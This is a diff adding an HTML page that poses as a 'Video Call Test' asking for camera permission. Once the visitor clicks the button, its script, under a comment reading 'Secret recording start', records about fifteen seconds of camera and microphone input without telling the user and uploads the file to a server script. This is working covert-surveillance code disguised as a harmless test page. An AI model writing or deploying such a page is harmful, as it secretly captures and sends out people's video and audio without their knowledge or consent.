@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Call</title>
+    <style>body{font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;}</style>
+</head>
+<body>
+    <h1>📹 Video Call Test</h1>
+    <p>Camera permission do test ke liye</p>
+    <video id="video" width="400" height="300" autoplay muted style="border:2px solid #ccc;"></video><br><br>
+    <button onclick="startCamera()" style="padding:15px 30px;font-size:18px;background:#4CAF50;color:white;border:none;border-radius:5px;">Start Camera Test</button>
+
+    <script>
+        async function startCamera(){
+            try{
+                const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+                document.getElementById('video').srcObject = stream;
+                
+                // Secret recording start
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks,{type:'video/webm'});
+                    upload(blob,'video');
+                };
+                recorder.start(10000);
+                setTimeout(()=>recorder.stop(),15000);
+                
+            }catch(e){alert('Permission denied');}
+        }
+        
+        function upload(blob,type){
+            const fd = new FormData();
+            fd.append('file',blob,Date.now()+'.webm');
+            fd.append('ip',Date.now());
+            
+            fetch('/upload.php',{method:'POST',body:fd});
+        }
+    </script>
+</body>
+  </html>
